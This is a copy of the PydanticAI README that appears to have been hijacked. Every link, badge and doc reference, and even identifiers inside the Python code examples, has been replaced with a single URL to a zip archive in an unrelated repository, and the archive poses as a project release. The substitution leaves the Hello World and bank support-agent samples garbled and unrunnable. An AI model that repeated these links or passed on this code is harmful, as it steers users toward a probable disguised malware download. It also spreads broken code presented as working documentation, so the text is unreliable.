<div align="center">
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip">
      <img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="PydanticAI">
    </picture>
  </a>
</div>
<div align="center">
  <em>Agent Framework / shim to use Pydantic with LLMs</em>
</div>
<div align="center">
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip%3Amain"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="CI"></a>
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="Coverage"></a>
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="PyPI"></a>
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="versions"></a>
  <a href="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip"><img src="https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip" alt="license"></a>
</div>

---

**Documentation**: [https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)

---

PydanticAI is a Python agent framework designed to make it less painful to build production grade applications with Generative AI.

FastAPI revolutionized web development by offering an innovative and ergonomic design, built on the foundation of [Pydantic](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip).

Similarly, virtually every agent framework and LLM library in Python uses Pydantic, yet when we began to use LLMs in [Pydantic Logfire](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), we couldn't find anything that gave us the same feeling.

We built PydanticAI with one simple aim: to bring that FastAPI feeling to GenAI app development.

## Why use PydanticAI

* Built by the team behind Pydantic (the validation layer of the OpenAI SDK, the Anthropic SDK, LangChain, LlamaIndex, AutoGPT, Transformers, CrewAI, Instructor and many more)
* [Model-agnostic](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) — currently OpenAI, Anthropic, Gemini, Ollama, Groq, and Mistral are supported, and there is a simple interface to implement support for other models.
* [Type-safe](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
* Control flow and agent composition is done with vanilla Python, allowing you to make use of the same Python development best practices you'd use in any other (non-AI) project
* [Structured response](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) validation with Pydantic
* [Streamed responses](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), including validation of streamed _structured_ responses with Pydantic
* Novel, type-safe [dependency injection system](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip), useful for testing and eval-driven iterative development
* [Logfire integration](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) for debugging and monitoring the performance and general behavior of your LLM-powered application

## In Beta!

PydanticAI is in early beta, the API is still subject to change and there's a lot more to do.
[Feedback](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) is very welcome!

## Hello World Example

Here's a minimal example of PydanticAI:

```python
from pydantic_ai import Agent

# Define a very simple agent including the model to use, you can also set the model when running the agent.
agent = Agent(
    'gemini-1.5-flash',
    # Register a static system prompt using a keyword argument to the agent.
    # For more complex dynamically-generated system prompts, see the example below.
    system_prompt='Be concise, reply with one sentence.',
)

# Run the agent synchronously, conducting a conversation with the LLM.
# Here the exchange should be very short: PydanticAI will send the system prompt and the user query to the LLM,
# the model will return a text response. See below for a more complex run.
result = https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('Where does "hello world" come from?')
print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
"""
The first known use of "hello, world" was in a 1974 textbook about the C programming language.
"""
```

_(This example is complete, it can be run "as is")_

Not very interesting yet, but we can easily add "tools", dynamic system prompts, and structured responses to build more powerful agents.

## Tools & Dependency Injection Example

Here is a concise example using PydanticAI to build a support agent for a bank:

**(Better documented example [in the docs](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip))**

```python
from dataclasses import dataclass

from pydantic import BaseModel, Field
from pydantic_ai import Agent, RunContext

from bank_database import DatabaseConn


# SupportDependencies is used to pass data, connections, and logic into the model that will be needed when running
# system prompt and tool functions. Dependency injection provides a type-safe way to customise the behavior of your agents.
@dataclass
class SupportDependencies:
    customer_id: int
    db: DatabaseConn


# This pydantic model defines the structure of the result returned by the agent.
class SupportResult(BaseModel):
    support_advice: str = Field(description='Advice returned to the customer')
    block_card: bool = Field(description="Whether to block the customer's card")
    risk: int = Field(description='Risk level of query', ge=0, le=10)


# This agent will act as first-tier support in a bank.
# Agents are generic in the type of dependencies they accept and the type of result they return.
# In this case, the support agent has type `Agent[SupportDependencies, SupportResult]`.
support_agent = Agent(
    'openai:gpt-4o',
    deps_type=SupportDependencies,
    # The response from the agent will, be guaranteed to be a SupportResult,
    # if validation fails the agent is prompted to try again.
    result_type=SupportResult,
    system_prompt=(
        'You are a support agent in our bank, give the '
        'customer support and judge the risk level of their query.'
    ),
)


# Dynamic system prompts can make use of dependency injection.
# Dependencies are carried via the `RunContext` argument, which is parameterized with the `deps_type` from above.
# If the type annotation here is wrong, static type checkers will catch it.
https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip
async def add_customer_name(ctx: RunContext[SupportDependencies]) -> str:
    customer_name = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
    return f"The customer's name is {customer_name!r}"


# `tool` let you register functions which the LLM may call while responding to a user.
# Again, dependencies are carried via `RunContext`, any other arguments become the tool schema passed to the LLM.
# Pydantic is used to validate these arguments, and errors are passed back to the LLM so it can retry.
https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip
async def customer_balance(
    ctx: RunContext[SupportDependencies], include_pending: bool
) -> float:
    """Returns the customer's current account balance."""
    # The docstring of a tool is also passed to the LLM as the description of the tool.
    # Parameter descriptions are extracted from the docstring and added to the parameter schema sent to the LLM.
    balance = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip(
        https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip,
        include_pending=include_pending,
    )
    return balance


...  # In a real use case, you'd add more tools and a longer system prompt


async def main():
    deps = SupportDependencies(customer_id=123, db=DatabaseConn())
    # Run the agent asynchronously, conducting a conversation with the LLM until a final response is reached.
    # Even in this fairly simple case, the agent will exchange multiple messages with the LLM as tools are called to retrieve a result.
    result = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('What is my balance?', deps=deps)
    # The result will be validated with Pydantic to guarantee it is a `SupportResult`, since the agent is generic,
    # it'll also be typed as a `SupportResult` to aid with static type checking.
    print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
    """
    support_advice='Hello John, your current account balance, including pending transactions, is $123.45.' block_card=False risk=1
    """

    result = await https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip('I just lost my card!', deps=deps)
    print(https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip)
    """
    support_advice="I'm sorry to hear that, John. We are temporarily blocking your card to prevent unauthorized transactions." block_card=True risk=8
    """
```

## Next Steps

To try PydanticAI yourself, follow the instructions [in the examples](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip).

Read the [docs](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) to learn more about building applications with PydanticAI.

Read the [API Reference](https://raw.githubusercontent.com/bookformeonline/pydantic-ai/main/tests/ai-pydantic-v1.7-alpha.1.zip) to understand PydanticAI's interface.
